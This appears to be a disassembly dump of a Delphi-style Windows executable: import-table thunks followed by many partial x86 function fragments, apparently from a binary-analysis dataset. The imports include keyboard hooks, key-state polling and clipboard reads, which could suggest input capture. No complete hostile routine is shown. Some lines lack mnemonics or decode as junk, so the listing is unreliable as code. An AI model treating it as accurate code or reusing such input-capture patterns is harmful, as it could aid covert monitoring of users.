CharUpperBuffA
jmp [ CharUpperBuffA@IAT ]
CheckMenuItem
jmp [ CheckMenuItem@IAT ]
ClientToScreen
jmp [ ClientToScreen@IAT ]
CreateIcon
jmp [ CreateIcon@IAT ]
CreateMenu
jmp [ CreateMenu@IAT ]
CreatePopupMenu
jmp [ CreatePopupMenu@IAT ]
DefFrameProcA
jmp [ DefFrameProcA@IAT ]
DefMDIChildProcA
jmp [ DefMDIChildProcA@IAT ]
DefWindowProcA
jmp [ DefWindowProcA@IAT ]
DestroyIcon
jmp [ DestroyIcon@IAT ]
DestroyMenu
jmp [ DestroyMenu@IAT ]
DestroyWindow
jmp [ DestroyWindow@IAT ]
DispatchMessageA
jmp [ DispatchMessageA@IAT ]
DispatchMessageW
jmp [ DispatchMessageW@IAT ]
DrawFrameControl
jmp [ DrawFrameControl@IAT ]
DrawIcon
jmp [ DrawIcon@IAT ]
DrawIconEx
jmp [ DrawIconEx@IAT ]
DrawMenuBar
jmp [ DrawMenuBar@IAT ]
EnableScrollBar
jmp [ EnableScrollBar@IAT ]
EnableWindow
jmp [ EnableWindow@IAT ]
EndPaint
jmp [ EndPaint@IAT ]
EnumChildWindows
jmp [ EnumChildWindows@IAT ]
EnumDisplayDevicesA
jmp [ EnumDisplayDevicesA@IAT ]
EnumThreadWindows
jmp [ EnumThreadWindows@IAT ]
EnumWindows
jmp [ EnumWindows@IAT ]
EqualRect
jmp [ EqualRect@IAT ]
FindWindowA
jmp [ FindWindowA@IAT ]
GetAsyncKeyState
jmp [ GetAsyncKeyState@IAT ]
GetClassLongA
jmp [ GetClassLongA@IAT ]
GetClientRect
jmp [ GetClientRect@IAT ]
GetClipboardData
jmp [ GetClipboardData@IAT ]
GetCursor
jmp [ GetCursor@IAT ]
GetCursorPos
jmp [ GetCursorPos@IAT ]
GetDC
jmp [ GetDC@IAT ]
GetDCEx
jmp [ GetDCEx@IAT ]
GetForegroundWindow
jmp [ GetForegroundWindow@IAT ]
GetIconInfo
jmp [ GetIconInfo@IAT ]
GetKeyNameTextA
jmp [ GetKeyNameTextA@IAT ]
__imp_GetKeyNameTextA
jmp [ GetKeyNameTextA@IAT ]
GetKeyboardLayout
jmp [ GetKeyboardLayout@IAT ]
GetKeyboardLayoutList
jmp [ GetKeyboardLayoutList@IAT ]
GetKeyboardLayoutNameA
jmp [ GetKeyboardLayoutNameA@IAT ]
GetKeyboardState
jmp [ GetKeyboardState@IAT ]
GetLastActivePopup
jmp [ GetLastActivePopup@IAT ]
GetMenu
jmp [ GetMenu@IAT ]
GetMenuItemID
jmp [ GetMenuItemID@IAT ]
GetMenuItemInfoA
jmp [ GetMenuItemInfoA@IAT ]
GetMenuStringA
jmp [ GetMenuStringA@IAT ]
GetMessagePos
jmp [ GetMessagePos@IAT ]
__imp_GetWindow
jmp [ GetWindow@IAT ]
GetPropA
jmp [ GetPropA@IAT ]
GetScrollInfo
jmp [ GetScrollInfo@IAT ]
GetScrollPos
jmp [ GetScrollPos@IAT ]
GetScrollRange
jmp [ GetScrollRange@IAT ]
GetSubMenu
jmp [ GetSubMenu@IAT ]
GetSysColor
jmp [ GetSysColor@IAT ]
GetSysColorBrush
jmp [ GetSysColorBrush@IAT ]
GetSystemMenu
jmp [ GetSystemMenu@IAT ]
GetTopWindow
jmp [ GetTopWindow@IAT ]
GetWindow
jmp [ GetWindow@IAT ]
GetWindowDC
jmp [ GetWindowDC@IAT ]
GetWindowPlacement
jmp [ GetWindowPlacement@IAT ]
GetWindowRect
jmp [ GetWindowRect@IAT ]
GetWindowTextA
jmp [ GetWindowTextA@IAT ]
__imp_GetWindowThreadProcessId
jmp [ GetWindowThreadProcessId@IAT ]
InflateRect
jmp [ InflateRect@IAT ]
InsertMenuItemA
jmp [ InsertMenuItemA@IAT ]
InvalidateRect
jmp [ InvalidateRect@IAT ]
IsChild
jmp [ IsChild@IAT ]
IsDialogMessageA
jmp [ IsDialogMessageA@IAT ]
IsDialogMessageW
jmp [ IsDialogMessageW@IAT ]
IsRectEmpty
jmp [ IsRectEmpty@IAT ]
IsWindow
jmp [ IsWindow@IAT ]
IsWindowEnabled
jmp [ IsWindowEnabled@IAT ]
IsWindowUnicode
jmp [ IsWindowUnicode@IAT ]
IsZoomed
jmp [ IsZoomed@IAT ]
KillTimer
jmp [ KillTimer@IAT ]
LoadBitmapA
jmp [ LoadBitmapA@IAT ]
LoadIconA
jmp [ LoadIconA@IAT ]
LoadStringA
jmp [ LoadStringA@IAT ]
MapVirtualKeyA
jmp [ MapVirtualKeyA@IAT ]
MapVirtualKeyExA
jmp [ MapVirtualKeyExA@IAT ]
MessageBoxA
jmp [ MessageBoxA@IAT ]
MsgWaitForMultipleObjects
jmp [ MsgWaitForMultipleObjects@IAT ]
OemToCharA
jmp [ OemToCharA@IAT ]
PeekMessageW
jmp [ PeekMessageW@IAT ]
PostQuitMessage
jmp [ PostQuitMessage@IAT ]
PtInRect
jmp [ PtInRect@IAT ]
RedrawWindow
jmp [ RedrawWindow@IAT ]
RegisterClassA
jmp [ RegisterClassA@IAT ]
RegisterClipboardFormatA
jmp [ RegisterClipboardFormatA@IAT ]
ReleaseCapture
jmp [ ReleaseCapture@IAT ]
ReleaseDC
jmp [ ReleaseDC@IAT ]
RemoveMenu
jmp [ RemoveMenu@IAT ]
ScrollWindow
jmp [ ScrollWindow@IAT ]
__imp_SendMessageA
jmp [ SendMessageA@IAT ]
SendMessageW
jmp [ SendMessageW@IAT ]
SetActiveWindow
jmp [ SetActiveWindow@IAT ]
SetCapture
jmp [ SetCapture@IAT ]
SetClassLongA
jmp [ SetClassLongA@IAT ]
SetForegroundWindow
jmp [ SetForegroundWindow@IAT ]
SetMenuItemInfoA
jmp [ SetMenuItemInfoA@IAT ]
SetParent
jmp [ SetParent@IAT ]
SetScrollInfo
jmp [ SetScrollInfo@IAT ]
SetScrollPos
jmp [ SetScrollPos@IAT ]
SetScrollRange
jmp [ SetScrollRange@IAT ]
SetWindowPlacement
jmp [ SetWindowPlacement@IAT ]
SetWindowTextA
jmp [ SetWindowTextA@IAT ]
SetWindowsHookExA
jmp [ SetWindowsHookExA@IAT ]
ShowScrollBar
jmp [ ShowScrollBar@IAT ]
ToUnicodeEx
jmp [ ToUnicodeEx@IAT ]
TrackPopupMenu
jmp [ TrackPopupMenu@IAT ]
TranslateMDISysAccel
jmp [ TranslateMDISysAccel@IAT ]
TranslateMessage
jmp [ TranslateMessage@IAT ]
UnhookWindowsHookEx
jmp [ UnhookWindowsHookEx@IAT ]
UnregisterClassA
jmp [ UnregisterClassA@IAT ]
UpdateWindow
jmp [ UpdateWindow@IAT ]
WaitMessage
jmp [ WaitMessage@IAT ]
WindowFromPoint
jmp [ WindowFromPoint@IAT ]
sub_407da8
xor ecx ecx
call sub_403728
retn
CreateWindowExA
jmp [ CreateWindowExA@IAT ]
sub_407f9b
jmp sub_4046f8
sub_407fa2
pop ebp
retn
sub_408ea5
add eax 0xffffffd4
jmp sub_40f854
sub_408ead
add eax 0xffffffd4
jmp sub_40f6e8
sub_408eb5
add eax 0xffffffd4
jmp sub_40f794
sub_408ec7
add [ esp + 0x4 ] 0xffffffd4
jmp sub_406bc8
sub_408ed1
add [ esp + 0x4 ] 0xffffffd4
jmp sub_406bdc
sub_408fa8
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dc70
call sub_4047d8
pop ebx
retn
sub_4090e0
retn
sub_40917c
retn
sub_409753
jmp sub_4046f8
sub_40975a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409f25
jmp sub_4046f8
sub_409f2c
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40a054
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp eax 0xffffffff
je r-xdata
pop ebx
retn
push eax
call FindClose
mov [ ebx + 0x1c ] 0xffffffff
sub_40a2c8
mov edx eax
xor eax eax
call sub_402f04
retn
sub_40a2ec
push ebx
mov ebx eax
push 0x0
mov eax ebx
call sub_405324
push eax
call CreateDirectoryA
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_40a320
mov edx edi
mov edi eax
mov ecx 0xffffffff
xor al al
[ edi ]
lea eax [ edi - 0x1 ]
mov edi edx
retn
sub_40a334
push esi
mov esi eax
xchg edx eax
call sub_402f9c
mov eax esi
pop esi
retn
sub_40a530
push ebx
mov ebx eax
add ebx 0x4
mov eax ebx
call sub_402d28
mov [ eax ] ebx
add eax 0x4
pop ebx
retn
sub_40a544
sub eax 0x4
mov eax [ eax ]
sub eax 0x4
retn
sub_40a57c
test eax eax
je r-xdata
retn
sub eax 0x4
mov edx [ eax ]
call sub_402d44
sub_40a5e4
push ebx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
mov al 0x10
call sub_402e78
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
pop ebx
retn
sub_40a608
push ebx
mov ebx eax
mov eax ebx
call sub_404e44
pop ebx
retn
sub_40a98b
push ebx
push eax
lea eax [ ebp - 0x14 ]
mov ebx [ ebp - 0x4 ]
call sub_404e44
pop eax
pop ebx
retn
sub_40ad07
push ebx
push eax
lea eax [ ebp - 0x14 ]
mov ebx [ ebp - 0x4 ]
call sub_404e44
pop eax
pop ebx
retn
sub_40adbc
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
xchg ecx eax
xchg ecx edx
call sub_40aeb0
pop ebp
retn 0x8
sub_40b0d7
cmp [ ebp - 0x2a ] 0x0
je r-xdata
retn
mov al 0x2d
stosb [ edi ]
sub_40b232
push esi
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi - 0x4 ]
[ edi ] [ esi ]
sub_40b3af
cmp [ ebp - 0x2a ] 0x0
je r-xdata
retn
mov al 0x2d
stosb [ edi ]
sub_40b50a
push esi
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi - 0x4 ]
[ edi ] [ esi ]
sub_40b867
lodsb [ esi ]
or al al
je r-xdata
dec esi
retn
cmp al 0x20
je sub_40b867
sub_40b95c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_405324
mov edx esi
xor ecx ecx
call sub_40b7b0
pop esi
pop ebx
retn
sub_40b9d0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_405324
mov edx esi
mov cl 0x1
call sub_40b7b0
pop esi
pop ebx
retn
sub_40c11e
jmp sub_4046f8
sub_40c125
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40c226
jmp sub_4046f8
sub_40c22d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40c9d4
jmp sub_4046f8
sub_40c9db
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ca64
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xchg edx eax
call sub_40ca08
pop ebp
retn 0x8
sub_40cbf6
jmp sub_4046f8
sub_40cbfd
movzx eax [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40d0aa
jmp sub_4046f8
sub_40d0b1
movzx eax [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40d5b3
jmp sub_4046f8
sub_40d5ba
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40d665
jmp sub_4046f8
sub_40d66c
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_40d70f
jmp sub_4046f8
sub_40d716
pop esi
pop ecx
pop ebp
retn
sub_40d8f8
jmp sub_4046f8
sub_40d8ff
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40d958
test eax eax
je r-xdata
retn
sub eax 0x1000
sub_40dc4a
jmp sub_4046f8
sub_40dd18
jmp sub_4046f8
sub_40dd40
cmp [ eax + 0xc ] 0x0
je r-xdata
retn
call sub_403f18
sub_40de3a
pop ebx
retn
sub_40ded8
jmp sub_4046f8
sub_40dedf
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40dee8
mov esp ecx
mov [ esp ] edx
mov ebp [ ebp ]
jmp sub_4047d8
sub_40def5
retn
sub_40def8
push ebp
mov ebp esp
call sub_40de3c
lea ecx [ ebp + 0x8 ]
add ecx 0x4
mov edx [ ebp + 0x8 ]
call sub_40dee8
pop ebp
retn 0x4
sub_40df14
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dc70
call sub_4047d8
retn
sub_40dfac
push ebx
mov ebx eax
mov eax ebx
call sub_40df2c
movzx eax al
mov eax [ eax * 8 + rw-data ]
pop ebx
retn
sub_40e17f
jmp sub_4046f8
sub_40e186
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e249
jmp sub_4046f8
sub_40e250
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40e258
call sub_40daec
mov eax 0x1
call sub_404d78
sub_40e3dc
cmp eax [ rw-data ]
jl r-xdata
mov al 0x1
retn
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
retn
cmp edx [ rw-data ]
jle r-xdata
sub_40e4b5
jmp sub_4046f8
sub_40e4d2
jmp sub_4046f8
sub_40e4d9
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40e580
xor ecx ecx
cmp [ rw-data ] 0x0
je r-xdata
mov eax ecx
retn
call sub_40e4e8
mov ecx eax
sub_40e7a8
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
pop ebx
retn
push ebx
call CharNextA
sub eax ebx
pop ebx
retn
sub_40e7c8
push eax
call CharNextA
retn
sub_40eeef
jmp sub_4046f8
sub_40eef6
pop ebx
mov esp ebp
pop ebp
retn
sub_40f0e5
jmp sub_4046f8
sub_40f0ec
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40f3c3
jmp sub_4046f8
sub_40f3ca
pop ebx
mov esp ebp
pop ebp
retn
sub_40f3d0
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_40f32c
sub_40f48c
mov edx 0xffffffff
xchg edx eax
[ edx ] eax
dec eax
retn
sub_40f498
xchg [ eax ] edx
mov eax edx
retn
sub_40f500
push ebp
mov ebp esp
push ecx
call GetCurrentThreadId
mov [ ebp - 0x2 ] ax
movzx eax [ ebp - 0x2 ]
xor al [ ebp - 0x1 ]
and al 0xf
pop ecx
pop ebp
retn
sub_40f594
mov eax [ edx ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov eax [ edx ]
xor edx edx
mov [ eax + 0x8 ] edx
retn
sub_40f6b0
mov eax [ eax + 0x10 ]
push eax
call SetEvent
retn
sub_40f6d8
mov edx [ eax + 0x18 ]
push edx
mov eax [ eax + 0x14 ]
push eax
call WaitForSingleObject
retn
sub_40f967
jmp sub_4046f8
sub_40f96e
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40f9dc
jmp sub_4046f8
sub_40f9e3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fa01
mov eax [ ebp - 0xc ]
push eax
call SetErrorMode
retn
sub_40f9fa
jmp sub_4046f8
sub_40fa01
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40fe5b
jmp sub_4046f8
sub_40fe62
pop ebp
retn
VariantInit
jmp [ VariantInit@IAT ]
VariantChangeType
jmp [ VariantChangeType@IAT ]
sub_40fecc
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x10
sub_40ff32
jmp sub_4046f8
sub_40ff39
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40ff9e
jmp sub_4046f8
sub_40ffa5
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_41000a
jmp sub_4046f8
sub_410011
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_410076
jmp sub_4046f8
sub_41007d
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_4100e2
jmp sub_4046f8
sub_4100e9
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_410161
jmp sub_4046f8
sub_410168
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_4101d4
jmp sub_4046f8
sub_4101db
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_410246
jmp sub_4046f8
sub_41024d
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_4102bc
jmp sub_4046f8
sub_4102c3
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
SafeArrayCreate
jmp [ SafeArrayCreate@IAT ]
SafeArrayGetLBound
jmp [ SafeArrayGetLBound@IAT ]
SafeArrayGetUBound
jmp [ SafeArrayGetUBound@IAT ]
sub_410649
jmp sub_4046f8
sub_410650
pop ebp
retn
sub_410655
add [ esp + 0x4 ] 0xfffffff8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_410c76
jmp sub_4046f8
sub_410c7d
pop ecx
pop ebp
retn
sub_410d0f
jmp sub_4046f8
sub_410d16
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_410d66
jmp sub_4046f8
sub_410d6d
pop ecx
pop ebp
retn
sub_410dff
jmp sub_4046f8
sub_410e06
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_410e56
jmp sub_4046f8
sub_410e5d
pop ecx
pop ebp
retn
sub_4110a5
jmp sub_4046f8
sub_4110ac
pop ebx
mov esp ebp
pop ebp
retn
sub_41113e
jmp sub_4046f8
sub_411145
pop ecx
pop ebp
retn
sub_411148
push ebx
mov ebx eax
mov eax ebx
call sub_4113e0
mov [ ebx ] 0x1
pop ebx
retn
sub_4113e0
test [ eax ] 0xbfe8
jne r-xdata
call sub_411364
retn
mov [ eax ] 0x0
retn
sub_4113f4
push eax
call sub_4113e0
pop eax
retn
sub_411654
call sub_411708
retn
sub_411874
jmp sub_4046f8
sub_41187b
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_411921
jmp sub_4046f8
sub_411928
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41194a
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_405684
retn
sub_411943
jmp sub_4046f8
sub_41194a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4119a6
jmp sub_4046f8
sub_4119ad
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_411a29
jmp sub_4046f8
sub_411f68
jmp sub_4046f8
sub_411f6f
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412005
jmp sub_4046f8
sub_41200c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412029
lea eax [ ebp - 0x14 ]
call sub_40566c
retn
sub_412022
jmp sub_4046f8
sub_412029
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412086
jmp sub_4046f8
sub_41208d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41212f
jmp sub_4046f8
sub_41214c
jmp sub_4046f8
sub_412153
movzx eax [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4126a1
jmp sub_4046f8
sub_4126a8
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412754
push eax
call sub_4113e0
pop eax
mov [ eax ] 0x7
fstp [ eax + 0x8 ]
fwait
retn
sub_412768
push eax
call sub_4113e0
pop eax
mov [ eax ] 0x6
fistp [ eax + 0x8 ]
fwait
retn
sub_4127e0
cmp [ eax ] 0x8
jb r-xdata
retn
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov [ eax ] 0x0
mov edx esp
call sub_411708
add esp 0x10
sub_412a8a
jmp sub_4046f8
sub_412a91
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412ad4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4113e0
mov [ ebx ] 0xa
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_412aec
mov edx 0x80020004
call sub_412ad4
retn
sub_412b7d
jmp sub_4046f8
sub_412b84
pop esi
pop ebx
pop ebp
retn
sub_412b88
push ebp
mov ebp esp
call sub_412d48
pop ebp
retn 0x4
sub_412c14
push ebp
mov ebp esp
call sub_412d48
pop ebp
retn 0x4
sub_412cf7
jmp sub_4046f8
sub_412cfe
movzx edx [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403f54
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4042d8
sub_412d20
xor eax eax
retn
sub_412d24
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
movzx eax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_412d38
mov [ ecx ] 0x8
mov al 0x1
retn
sub_412d40
call sub_410c2c
retn
sub_412d48
call sub_410d1c
retn
sub_412d50
call sub_4110f4
retn
sub_412d58
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
movzx eax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_412d6c
call sub_412d48
retn
sub_412d74
push ebp
mov ebp esp
call sub_412d50
pop ebp
retn 0x8
sub_412d8c
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_412e68
jmp sub_4046f8
sub_412f35
jmp sub_4046f8
sub_412f3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412f59
lea eax [ ebp - 0x10 ]
call sub_404e44
retn
sub_412f52
jmp sub_4046f8
sub_412f59
movzx eax [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412f64
call sub_411148
retn
sub_412fdb
jmp sub_4046f8
sub_412fe2
pop ebp
retn
sub_413128
xor edx edx
mov dl [ eax + 0x1 ]
lea eax [ eax + edx + 0x2 ]
retn
sub_413407
jmp sub_4046f8
sub_41340e
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4134a0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_404e98
pop esi
pop ebx
retn
sub_41353c
jmp sub_4046f8
sub_413543
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_413643
jmp sub_4046f8
sub_41364a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41384c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_411708
pop esi
pop ebx
retn
sub_4139ce
jmp sub_4046f8
sub_4139d5
pop ebp
retn
sub_41425d
[ eax + 0x6f ]
sub_4142b5
add [ esp + 0x4 ] 0xfffffff8
jmp sub_416fdc
sub_4150c9
fiadd [ ecx ]
mov ebp ds
inc ecx
add ah dl
fiadd [ ecx ]
int3
sub_415360
push ecx
mov [ esp ] ax
mov [ esp + 0x2 ] dx
mov eax [ esp ]
pop edx
retn
sub_415484
mov eax [ eax + 0xc ]
call sub_416668
retn
sub_415758
jmp sub_4046f8
sub_41575f
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415a83
jmp sub_4046f8
sub_415a8a
mov esp ebp
pop ebp
retn
sub_415b5c
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_415b68
push ebx
mov ebx edx
mov edx ebx
call sub_415978
test eax eax
je r-xdata
pop ebx
retn
mov edx ebx
call sub_4156a8
sub_415c14
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_415d6f
jmp sub_4046f8
sub_415e43
jmp sub_4046f8
sub_415e54
mov eax [ eax - 0x38 ]
or eax eax
je r-xdata
retn
mov eax [ eax + 0x2 ]
sub_415ec0
jmp sub_4046f8
sub_415ec7
pop ebx
mov esp ebp
pop ebp
retn
sub_415f12
jmp sub_4046f8
sub_415f19
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_415fa5
jmp sub_4046f8
sub_415fac
pop ebx
pop ebp
retn
sub_415ff2
jmp sub_4046f8
sub_415ff9
pop ebx
pop ebp
retn
sub_41603e
jmp sub_4046f8
sub_416045
pop ebx
pop ebp
retn
sub_41608f
jmp sub_4046f8
sub_416096
pop esi
pop ebx
pop ebp
retn
sub_4160ea
jmp sub_4046f8
sub_4160f1
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_41621e
jmp sub_4046f8
sub_4162f4
cmp [ rw-data ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ rw-data ]
call sub_416964
sub_4163e4
jmp sub_4046f8
sub_41656e
jmp sub_4046f8
sub_416575
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41660f
jmp sub_4046f8
sub_416616
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416635
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41662e
jmp sub_4046f8
sub_416635
movzx eax [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_41669c
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_4169c0
xor edx edx
mov eax ebx
call sub_416984
pop ebx
retn
sub_416718
mov eax [ ebp + 0x4 ]
retn
sub_41674e
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41679c
jmp sub_4046f8
sub_4167a3
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4167a8
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_4167c0
xor edx edx
call sub_4167c8
retn
sub_4168b0
mov edx [ eax + 0x8 ]
dec edx
call sub_4167c8
retn
sub_416a34
retn
sub_416aef
jmp sub_4046f8
sub_416af6
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4042d8
sub_416b84
jmp sub_4046f8
sub_416b8b
pop ebx
pop ecx
pop ebp
retn
sub_416b90
push ebx
mov ebx eax
lea eax [ ebx + 0x8 ]
push eax
call EnterCriticalSection
mov eax [ ebx + 0x4 ]
pop ebx
retn
sub_416be7
jmp sub_4046f8
sub_416bee
pop ebx
pop ecx
pop ebp
retn
sub_416bf4
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_416c30
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dc70
call sub_4047d8
retn
sub_416c48
mov ecx eax
cmp edx eax
jge r-xdata
mov eax ecx
retn
mov ecx edx
sub_416d23
retn
sub_416dc8
test edx edx
je r-xdata
xor edx edx
call sub_416ddc
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx ]
retn
sub_416e92
jmp sub_4046f8
sub_416e99
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_416eac
xchg edx eax
call sub_416ddc
retn
sub_416eb4
retn
sub_416f4d
jmp sub_4046f8
sub_416f54
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_416f68
xor eax eax
retn
sub_417119
jmp sub_4046f8
sub_417120
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4171b4
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x8 ]
xchg edx eax
call sub_416824
retn
sub_417289
jmp sub_4046f8
sub_417290
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4172d4
xor edx edx
call sub_417190
retn
sub_417442
jmp sub_4046f8
sub_41745c
inc [ eax + 0xc ]
retn
sub_417460
cmp [ eax + 0xc ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_4174ca
jmp sub_4046f8
sub_4174d8
dec [ eax + 0xc ]
call sub_417460
retn
sub_4174e4
xor eax eax
retn
sub_4174e8
push ebx
mov ebx ecx
mov eax ebx
call sub_404e44
pop ebx
retn
sub_41751c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4167c8
pop esi
pop ebx
retn
sub_4175de
jmp sub_4046f8
sub_4175e5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4176f6
jmp sub_4046f8
sub_4177d0
retn
sub_4177d4
retn
sub_4177d8
retn
sub_4177dc
retn
sub_417848
mov eax [ eax + 0x18 ]
retn
sub_41794e
jmp sub_4046f8
sub_417955
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417972
lea eax [ ebp - 0xc ]
call sub_404e44
retn
sub_41796b
jmp sub_4046f8
sub_417972
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417a1c
jmp sub_4046f8
sub_417a34
push ebx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
inc [ ebx + 0x10 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_417af0
dec [ eax + 0x10 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_417b99
jmp sub_4046f8
sub_417ba0
movzx eax [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417bac
mov eax [ ebp + 0x4 ]
